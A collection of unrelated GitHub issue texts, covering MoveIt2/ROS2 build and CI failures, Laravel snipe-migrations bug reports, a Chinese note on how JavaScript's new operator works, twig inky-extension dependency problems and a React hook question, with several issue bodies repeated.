/Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/include/moveit_simple_controller_manager/follow_joint_trajectory_controller_handle.h:73:115: error: no type named 'WrappedResult' in 'rclcpp_action::ClientGoalHandle<control_msgs::action::FollowJointTrajectory>'
  void controllerDoneCallback(const rclcpp_action::ClientGoalHandle<control_msgs::action::FollowJointTrajectory>::WrappedResult& result);
                                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/src/follow_joint_trajectory_controller_handle.cpp:68:96: error: no member named 'SendGoalOptions' in 'rclcpp_action::Client<control_msgs::action::FollowJointTrajectory>'
  auto send_goal_options = rclcpp_action::Client<control_msgs::action::FollowJointTrajectory>::SendGoalOptions();
                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/src/moveit_simple_controller_manager.cpp:54:8: warning: 'initialize' overrides a member function but is not marked 'override' [-Winconsistent-missing-override]
  void initialize(std::shared_ptr<rclcpp::Node>& node)
       ^
/Users/victor/ros2_moveit_ws/install/include/moveit/controller_manager/controller_manager.h:187:16: note: overridden virtual function is here
  virtual void initialize(std::shared_ptr<rclcpp::Node>& node) = 0;
               ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/src/follow_joint_trajectory_controller_handle.cpp:225:152: error: no type named 'WrappedResult' in 'rclcpp_action::ClientGoalHandle<control_msgs::action::FollowJointTrajectory>'
void FollowJointTrajectoryControllerHandle::controllerDoneCallback(const rclcpp_action::ClientGoalHandle<control_msgs::action::FollowJointTrajectory>::WrappedResult& result)
                                                                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/src/follow_joint_trajectory_controller_handle.cpp:230:3: error: expected expression
  else
  ^
1 warning and 1 error generated.
make[2]: *** [CMakeFiles/moveit_simple_controller_manager.dir/src/moveit_simple_controller_manager.cpp.o] Error 1
make[2]: *** Waiting for unfinished jobs....
4 errors generated.
make[2]: *** [CMakeFiles/moveit_simple_controller_manager.dir/src/follow_joint_trajectory_controller_handle.cpp.o] Error 1
make[1]: *** [CMakeFiles/moveit_simple_controller_manager.dir/all] Error 2
make: *** [all] Error 2
---
Failed   <<< moveit_simple_controller_manager	[ Exited with code 2 ]

Summary: 0 packages finished [6.33s]
  1 package failed: moveit_simple_controller_manager
  1 package had stderr output: moveit_simple_controller_manager
The file /Users/victor/ros2_moveit_ws/None does not exist.
``` @anasarrak, let's go back to Isometry3d please. You have an example at the transforms submodule of moveit_core https://github.com/ros-planning/moveit2/pull/12/commits/94ebbcc191db16d6e3fae760d2d8b8062517d53f.

This follows from https://github.com/ros2/geometry2/pull/93 which changes geometry2. 
**Make sure you pull the `master` branch of geometry2**.

-----

@LanderU, can you please update CI so that we fetch the `master` branch (instead of the `ros2` branch as we were doing before)? First draft for Linux is ready on: https://github.com/AcutronicRobotics/moveit2/tree/prepare-dashing-ci. Docker images ready on docker hub: https://hub.docker.com/r/acutronicrobotics/moveit2/tags, Dockerfile needs more work.

Travis (fails): https://travis-ci.org/AcutronicRobotics/moveit2/builds/531219244 It appears the CI is broken in master for OS X:
```bash
/usr/local/include/console_bridge/console.h:67:88: warning: token pasting of ',' and __VA_ARGS__ is a GNU extension [-Wgnu-zero-variadic-macro-arguments]
/usr/local/include/console_bridge/console.h:67:88: warning: token pasting of ',' and __VA_ARGS__ is a GNU extension [-Wgnu-zero-variadic-macro-arguments]
/usr/local/include/console_bridge/console.h:67:88: warning: token pasting of ',' and __VA_ARGS__ is a GNU extension [-Wgnu-zero-variadic-macro-arguments]
/usr/local/include/console_bridge/console.h:67:90: warning: token pasting of ',' and __VA_ARGS__ is a GNU extension [-Wgnu-zero-variadic-macro-arguments]
  console_bridge::log(__FILE__, __LINE__, console_bridge::CONSOLE_BRIDGE_LOG_ERROR, fmt, ##__VA_ARGS__)
                                                                                         ^
/usr/local/include/console_bridge/console.h:67:90: warning: token pasting of ',' and __VA_ARGS__ is a GNU extension [-Wgnu-zero-variadic-macro-arguments]
50 warnings generated.
---
Finished <<< srdfdom [2min 19s]
[Processing: geometric_shapes, image_transport, object_recognition_msgs, octomap_msgs]
--- stderr: image_transport
/Users/victor/ros2_moveit_ws/src/image_common/image_transport/test/test_remapping.cpp:22:13: error: no type named 'NodeOptions' in namespace 'rclcpp'
    rclcpp::NodeOptions node_options;
    ~~~~~~~~^
1 error generated.
make[2]: *** [CMakeFiles/image_transport-remapping.dir/test/test_remapping.cpp.o] Error 1
make[1]: *** [CMakeFiles/image_transport-remapping.dir/all] Error 2
make: *** [all] Error 2
make: INTERNAL: Exiting with 9 jobserver tokens available; should be 8!
---
Failed   <<< image_transport	[ Exited with code 2 ]
--- stderr: geometric_shapes
geometric_shapes: You did not request a specific build type: Choosing 'Release' for maximum performance
---
Aborted  <<< geometric_shapes
Aborted  <<< octomap_msgs
Aborted  <<< object_recognition_msgs
```

And also in Linux https://travis-ci.org/AcutronicRobotics/moveit2/builds/519581189#L2586 
 Together with https://github.com/AcutronicRobotics/moveit2/issues/68, can we try and address the CI @ahcorde and @anasarrak? ### Description

There seems to be a problem with the existing codebase of moveit2 when built with `--symlink-install` (fails to build) versus when built with `--merge-install`.

### Your environment
* ROS Distro: Dashing
* OS Version: OS X 10.14 (validated as well with Ubuntu 18.04)
* Source

### Steps to reproduce
#### `--merge-install`
```bash
colcon build --merge-install --cmake-args -DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS=ON -DINSTALL_EXAMPLES=OFF -DSECURITY=ON --no-warn-unused-cli -DCMAKE_BUILD_TYPE=Debug
/usr/local/lib/python3.7/site-packages/colcon_core/executor/__init__.py:323: UserWarning: The ExecutorExtensionPoint 'parallel' uses a deprecated signature for the 'execute' method
  .format_map(locals()))
Starting >>> eigen_stl_containers
Starting >>> joint_state_publisher
Starting >>> object_recognition_msgs
Starting >>> octomap_msgs
Starting >>> random_numbers
Starting >>> urdfdom_py
...
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/collision_distance_field/include/moveit/collision_distance_field/collision_world_distance_field.h:151:93: warning: unused parameter 'world' [-Wunused-parameter]
  void distanceWorld(const DistanceRequest& req, DistanceResult& res, const CollisionWorld& world) const override
                                                                                            ^
98 warnings generated.
---
Finished <<< moveit_core [2min 30s]
Starting >>> moveit_ros_perception
```

#### `--symlink-install`
```bash
colcon build --symlink-install --cmake-args -DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS=ON                                  -DINSTALL_EXAMPLES=OFF -DSECURITY=ON --no-warn-unused-cli                                  -DCMAKE_BUILD_TYPE=Debug
/usr/local/lib/python3.7/site-packages/colcon_core/executor/__init__.py:323: UserWarning: The ExecutorExtensionPoint 'parallel' uses a deprecated signature for the 'execute' method
  .format_map(locals()))
Starting >>> eigen_stl_containers
Starting >>> joint_state_publisher
Starting >>> object_recognition_msgs
Starting >>> octomap_msgs
Starting >>> random_numbers
Starting >>> urdfdom_py
...
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/collision_detection/include/moveit/collision_detection/collision_common.h:47:
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_model/include/moveit/robot_model/robot_model.h:43:10: fatal error: 'srdfdom/model.h' file not found
#include <srdfdom/model.h>
         ^~~~~~~~~~~~~~~~~
1 error generated.
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/kinematics_base/src/kinematics_base.cpp:37:
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/kinematics_base/include/moveit/kinematics_base/kinematics_base.h:299:52: warning: unused parameter 'context_state' [-Wunused-parameter]
                   const moveit::core::RobotState* context_state = NULL) const
                                                   ^
make[2]: *** [collision_detection/CMakeFiles/moveit_collision_detection.dir/src/allvalid/collision_robot_allvalid.cpp.o] Error 1
make[2]: *** Waiting for unfinished jobs....
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/kinematics_base/src/kinematics_base.cpp:38:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_model/include/moveit/robot_model/joint_model_group.h:41:
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_model/include/moveit/robot_model/joint_model.h:46:10: fatal error: 'random_numbers/random_numbers.h' file not found
#include <random_numbers/random_numbers.h>
         ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/collision_detection/src/allvalid/collision_world_allvalid.cpp:37:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/collision_detection/include/moveit/collision_detection/allvalid/collision_world_allvalid.h:40:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/collision_detection/include/moveit/collision_detection/collision_world.h:42:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/collision_detection/include/moveit/collision_detection/collision_matrix.h:40:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/collision_detection/include/moveit/collision_detection/collision_common.h:47:
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_model/include/moveit/robot_model/robot_model.h:43:10: fatal error: 'srdfdom/model.h' file not found
#include <srdfdom/model.h>
         ^~~~~~~~~~~~~~~~~
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/profiler/src/profiler.cpp:177:32: warning: data argument not used by format string [-Wformat-extra-args]
  RCUTILS_LOG_INFO("profiler", ss.str().c_str());
                   ~~~~~~~~~~  ^
/Users/victor/ros2_ws/install/include/rcutils/logging_macros.h:492:5: note: expanded from macro 'RCUTILS_LOG_INFO'
    __VA_ARGS__)
    ^~~~~~~~~~~
/Users/victor/ros2_ws/install/include/rcutils/logging_macros.h:72:64: note: expanded from macro 'RCUTILS_LOG_COND_NAMED'
      rcutils_log(&__rcutils_logging_location, severity, name, __VA_ARGS__); \
                                                               ^~~~~~~~~~~
1 warning and 1 error generated.
make[2]: *** [kinematics_base/CMakeFiles/moveit_kinematics_base.dir/src/kinematics_base.cpp.o] Error 1
make[1]: *** [kinematics_base/CMakeFiles/moveit_kinematics_base.dir/all] Error 2
make[1]: *** Waiting for unfinished jobs....
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/utils/src/robot_model_test_utils.cpp:41:
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/utils/include/moveit/utils/robot_model_test_utils.h:44:10: fatal error: 'srdfdom/srdf_writer.h' file not found
#include <srdfdom/srdf_writer.h>
         ^~~~~~~~~~~~~~~~~~~~~~~
1 error generated.
make[2]: *** [collision_detection/CMakeFiles/moveit_collision_detection.dir/src/allvalid/collision_world_allvalid.cpp.o] Error 1
make[1]: *** [collision_detection/CMakeFiles/moveit_collision_detection.dir/all] Error 2
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/planning_request_adapter/src/planning_request_adapter.cpp:37:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/planning_request_adapter/include/moveit/planning_request_adapter/planning_request_adapter.h:41:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/planning_interface/include/moveit/planning_interface/planning_interface.h:42:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/planning_interface/include/moveit/planning_interface/planning_response.h:40:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_trajectory/include/moveit/robot_trajectory/robot_trajectory.h:42:
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/include/moveit/robot_state/robot_state.h:41:
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_model/include/moveit/robot_model/robot_model.h:43:10: fatal error: 'srdfdom/model.h' file not found
#include <srdfdom/model.h>
         ^~~~~~~~~~~~~~~~~
1 error generated.
make[2]: *** [utils/CMakeFiles/moveit_test_utils.dir/src/robot_model_test_utils.cpp.o] Error 1
make[1]: *** [utils/CMakeFiles/moveit_test_utils.dir/all] Error 2
1 warning generated.
1 error generated.
make[2]: *** [planning_request_adapter/CMakeFiles/moveit_planning_request_adapter.dir/src/planning_request_adapter.cpp.o] Error 1
make[1]: *** [planning_request_adapter/CMakeFiles/moveit_planning_request_adapter.dir/all] Error 2
make: *** [all] Error 2
---
Failed   <<< moveit_core	[ Exited with code 2 ]
``` ### Description

Overview of your issue here.

### Your environment
* ROS Distro: Dashing
* OS Version: Ubuntu 18.04.2 LTS
* Source build

### Steps to reproduce
When building the moveit2 ws from source:

```bash
Starting >>> tf2_geometry_msgs
--- stderr: tf2_geometry_msgs
CMakeFiles/test_tf2_geometry_msgs.dir/test/test_tf2_geometry_msgs.cpp.o: In function `main':
test_tf2_geometry_msgs.cpp:(.text+0x2ab4): undefined reference to `tf2_ros::Buffer::Buffer(std::shared_ptr<rclcpp::Clock>, std::chrono::duration<long, std::ratio<1l, 1000000000l> >)'
collect2: error: ld returned 1 exit status
make[2]: *** [test_tf2_geometry_msgs] Error 1
make[1]: *** [CMakeFiles/test_tf2_geometry_msgs.dir/all] Error 2
make: *** [all] Error 2
---
Failed   <<< tf2_geometry_msgs	[ Exited with code 2 ]
```

Is this due to the fact that Dashing ROS 2 installation has issues with `geometry2`?
<---------->
171511006
I neither have `mysql` nor `mysqldump` running on my system. We use docker (and docker-compose) to run our services and thus don't need them installed locally.

Since snipe-migrations uses `exec()` in the background, this silently fails in case these binaries are not installed.

For me, the fix would be to call `docker-compose mysql_test {command}` (e.g. `docker-compose mysql_test mysqldump ...`).

It would be great if there could be a way to either:
- specify a prefix (or binary location) or
- call the binary "by hand"

using methods that can be overwritten by the actual test case like so (pseudo-code):

```php
class TestCase {
  use SnipeMigrations;

  protected function getSnipeBinaryPath()
  {
    return 'docker-compose mysql_test`;
  }
}
```

(or another, suitable method name). I neither have `mysql` nor `mysqldump` running on my system. We use docker (and docker-compose) to run our services and thus don't need them installed locally.

Since snipe-migrations uses `exec()` in the background, this silently fails in case these binaries are not installed.

For me, the fix would be to call `docker-compose mysql_test {command}` (e.g. `docker-compose mysql_test mysqldump ...`).

It would be great if there could be a way to either:
- specify a prefix (or binary location) or
- call the binary "by hand"

using methods that can be overwritten by the actual test case like so (pseudo-code):

```php
class TestCase {
  use SnipeMigrations;

  protected function getSnipeBinaryPath()
  {
    return 'docker-compose mysql_test`;
  }
}
```

(or another, suitable method name). The package needs more tests before adding any additional features. I know you've mentioned SQLite support in the future but was just wondering if you have any thoughts on the implementation.

For starters, would it be SQLite to SQLite setup or would it allow MySQL to SQLite setup? We use MySQL in production but SQLite in our tests.

We already have something similar to this package that we use to facilitate the MySQL to SQLite migration for testing, but implementing it in a package like this looks a little tricky because I can't see an easy way to get the database credentials for each database as when the tests are running, you cant get the MySQL credentials as they are normally stored in environment vars.

Have you any thoughts on this? Readme says that package requires `PHP >= 7.1`, but the [`composer.json` wants `^7.2`](https://github.com/drfraker/snipe-migrations/blob/master/composer.json#L13).

Do we really need `^7.2`? 🙂  is it planned? Readme says that package requires `PHP >= 7.1`, but the [`composer.json` wants `^7.2`](https://github.com/drfraker/snipe-migrations/blob/master/composer.json#L13).

Do we really need `^7.2`? 🙂  I'm using the `DatabaseMigrations` trait, instead of the `RefreshDatabase` trait, as I'm running my tests through Dusk.

Is it possible for Snipe Migrations to work with `DatabaseMigrations` as well? When I was setting this up on my Windows (localhost), I ran into a couple of problems:

1. I had to add MySQL to my PATH so that the mysqldump command would work. Maybe this should be stated on the README? It wasn't immediately obvious to me, at least.

2. The "2>/dev/null" at the end of the mysqldump call gives the output "The system cannot find the file specified" and results in an empty `snipe_snapshot.sql` file. Removing it fixes the error and the sql file is then populated.  Does not work for me with 5.4.
Relies on `migrate:fresh` command to execute, but that one has been introduced in laravel 5.5. Readme says that package requires `PHP >= 7.1`, but the [`composer.json` wants `^7.2`](https://github.com/drfraker/snipe-migrations/blob/master/composer.json#L13).

Do we really need `^7.2`? 🙂  The package needs more tests before adding any additional feature. It seems like there is no default configuration and `file_put_contents` does not seem to like an empty file name. I haven't published the configurations yet. It might fix it, but just letting know that it does not work out-of-the-box.

`file_put_contents(config('snipe.snipefile-location'), $timeSum);`

```
ErrorException: file_put_contents(): Filename cannot be empty
   │ 
   │ /var/www/pillar.science/src/api/vendor/drfraker/snipe-migrations/src/Snipe.php:49
   │ /var/www/pillar.science/src/api/vendor/drfraker/snipe-migrations/src/Snipe.php:20
   │ /var/www/pillar.science/src/api/vendor/drfraker/snipe-migrations/src/SnipeMigrations.php:15
   │ /var/www/pillar.science/src/api/vendor/laravel/framework/src/Illuminate/Foundation/Testing/TestCase.php:71
   │ /var/www/pillar.science/src/api/tests/Functional/Services/Search/SearchServiceTest.php:44

```

I guess just adding a default value to `config('snipe.snipefile-location', 'default-location.txt')` might do the trick here. Readme says that package requires `PHP >= 7.1`, but the [`composer.json` wants `^7.2`](https://github.com/drfraker/snipe-migrations/blob/master/composer.json#L13).

Do we really need `^7.2`? 🙂  I'm using the `DatabaseMigrations` trait, instead of the `RefreshDatabase` trait, as I'm running my tests through Dusk.

Is it possible for Snipe Migrations to work with `DatabaseMigrations` as well? It seems like there is no default configuration and `file_put_contents` does not seem to like an empty file name. I haven't published the configurations yet. It might fix it, but just letting know that it does not work out-of-the-box.

`file_put_contents(config('snipe.snipefile-location'), $timeSum);`

```
ErrorException: file_put_contents(): Filename cannot be empty
   │ 
   │ /var/www/pillar.science/src/api/vendor/drfraker/snipe-migrations/src/Snipe.php:49
   │ /var/www/pillar.science/src/api/vendor/drfraker/snipe-migrations/src/Snipe.php:20
   │ /var/www/pillar.science/src/api/vendor/drfraker/snipe-migrations/src/SnipeMigrations.php:15
   │ /var/www/pillar.science/src/api/vendor/laravel/framework/src/Illuminate/Foundation/Testing/TestCase.php:71
   │ /var/www/pillar.science/src/api/tests/Functional/Services/Search/SearchServiceTest.php:44

```
 It lacks `-h hostname` clause for `mysqldump` and `mysql` commands. Does not work for me with 5.4.
Relies on `migrate:fresh` command to execute, but that one has been introduced in laravel 5.5. It lacks `-h hostname` clause for `mysqldump` and `mysql` commands.
<---------->
171841073
```javascript
 function SayHello(msg) {
        this.msg = msg
        this.print = function() {
            console.log(this.msg)
        }
    }
    let hello = new SayHello('hello')
```
上面创建构造函数。并用new运算符实例化一个hello，一共经历了以下四个步骤：
```
let obj = {}

obj.__proto__ = SayHello.prototype

let result = SayHello.call(obj,'Hello!')

return typeof result === 'object' ? result : obj
```

1. 创建一个空对象obj。
2. 将obj的__proto__指向构造函数对象Obj的prototype成员对象，此时obj的原型链为obj -> SayHello.prototype -> Object.prototype -> null。
3. 将构造函数SayHello的作用域赋给新对象，在obj的上下文中调用SayHello函数并传出参数'Hello!'。于是我们就给obj对象创建了变量msg，变量的值是'Hello!'。
4. 检查构造函数的返回值，如果返回值为对象，则将返回的这个对象作为返回值，否则返回刚创建的obj。

<---------->
172253831
  Similar blocks of code found in 2 locations. Consider refactoring.

https://codeclimate.com/github/tuarrep/sounddrop/service/mesher.go#issue_5c77ce42084095000100002e
<---------->
172287350
Pinky requires the XSL PHP extension to be installed (https://github.com/lorenzo/pinky/issues/9), but it didn't required it in its composer.json before 1.0.4 (https://github.com/lorenzo/pinky/commit/9a330a41147b25b344a62a6f1806cb40faa613c6).

As I didn't have this extension installed and just ran `composer require twig/inky-extension`, and the error I got wasn't very clear :
```
An exception has been thrown during the rendering of a template ("Warning: Use of undefined constant XSL_SECPREF_READ_FILE - assumed 'XSL_SECPREF_READ_FILE' (this will throw an Error in a future version of PHP)").
```

Maybe you should update the dependency version to at least 1.0.4 so we can't install it without having ext-xsl installed Pinky requires the XSL PHP extension to be installed (https://github.com/lorenzo/pinky/issues/9), but it didn't required it in its composer.json before 1.0.4 (https://github.com/lorenzo/pinky/commit/9a330a41147b25b344a62a6f1806cb40faa613c6).

As I didn't have this extension installed and just ran `composer require twig/inky-extension`, and the error I got wasn't very clear :
```
An exception has been thrown during the rendering of a template ("Warning: Use of undefined constant XSL_SECPREF_READ_FILE - assumed 'XSL_SECPREF_READ_FILE' (this will throw an Error in a future version of PHP)").
```

Maybe you should update the dependency version to at least 1.0.4 so we can't install it without having ext-xsl installed Hi,
wanted to know if this is for the old Inky or if it's updated for the Foundation for Emails 2.
https://foundation.zurb.com/emails.html ```Symfony\Component\DependencyInjection\Exception\LogicException: Service '{service name}' for consumer 'twig' does not implement Twig\Extension\ExtensionInterface```

This is only a problem seemingly in twig 1.34. Where AbstractExtension doesn't implement ExtensionInterface.

 ```Symfony\Component\DependencyInjection\Exception\LogicException: Service '{service name}' for consumer 'twig' does not implement Twig\Extension\ExtensionInterface```

This is only a problem seemingly in twig 1.34. Where AbstractExtension doesn't implement ExtensionInterface.

 Hi,
wanted to know if this is for the old Inky or if it's updated for the Foundation for Emails 2.
https://foundation.zurb.com/emails.html
<---------->
172699252
Thanks a lot for your work. But I don't know how to use this code, it does not like python main.py?
<---------->
172815393
I checked through the source and saw that the state is being set on every scroll event, does that not seem to be expensive? ```js
const [prompt, prompting] = usePrompt(() => <Dialog />);
// or
const [prompt, prompting] = usePrompt();

prompt(() => <Dialog />);
```
<---------->
